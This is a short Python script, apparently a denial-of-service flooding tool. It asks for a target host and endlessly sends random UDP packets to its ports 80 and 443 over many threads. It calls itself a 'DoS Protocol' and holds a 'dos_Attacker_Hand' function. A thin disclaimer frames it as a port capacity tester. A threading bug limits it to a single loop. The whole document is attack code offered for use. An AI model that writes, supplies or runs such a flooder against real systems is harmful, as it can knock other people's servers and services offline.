import sys
import socket
import threading as t
import random as r
import datetime
import os

"""
Plesae use this utility to test the capacity of server ports

Disclaimer:
I do not take any responsibility for my utilities causing any harm, aiding in anyone's mal intent, and the like.
"""

print('\033[92mASC Basis Detected... DoS Protocol Established \033[92m')

target = socket.gethostbyname(input('Enter Your Target: '))

print(f'\033[91mTarget IP Achieved: {target} at {datetime.datetime.now()}\033[91m')

tc = input('\033[92mEnter Thread Count: ')
tp = input('\033[92mEnter Thread Persistance (Amount of Thread Groups): ')

print(f'\033[91mThread Count of {tc} established at {datetime.datetime.now()}.\033[91m')
print(f'\033[91mThread Persistance of {tp} established at {datetime.datetime.now()}.\033[91m')

def random_Message():

    message = ''

    for i in range(1, 8):
        message = message+str(r.randint(0, 255))

    message=message+' -ASC'
    return message


def dos_Attacker_Hand(round_data, target_ip=target):
    while 1:
        message = str.encode(random_Message())
        message = str(message).replace('b', '')
        message = str(message).replace("'", '')
        target_port = 80
        target_port_alt = 443
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(str(message), "utf-8"), (target_ip, target_port))
        sock.sendto(bytes(str(message), "utf-8"), (target_ip, target_port_alt))
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''\033[91mPacket Send Achieved at {(datetime.datetime.now())}. 
Target IP: {target_ip}
Data: {round_data} at port \033[93m{target_port}\033[91m. 
Message Text Decode: \033[92m{message}\033[91m. 
Proceeding...\033[91m''')
        print(f'''\n\033[91mPacket Send Achieved at {(datetime.datetime.now())} 
Target IP: {target_ip}
Data: {round_data} at port \033[93m{target_port}\033[91m. 
Message Text Decode: \033[92m{message}\033[91m. 
Proceeding...\033[91m''')

for i in range(int(tp)):
    for j in range(int(tc)):
        try:
            t.Thread(target=dos_Attacker_Hand(round_data=f'\033[93mTP Round: {i} at TC Round: {j}\033[91m')).start()
                
        except KeyboardInterrupt:
            sys.exit(0)
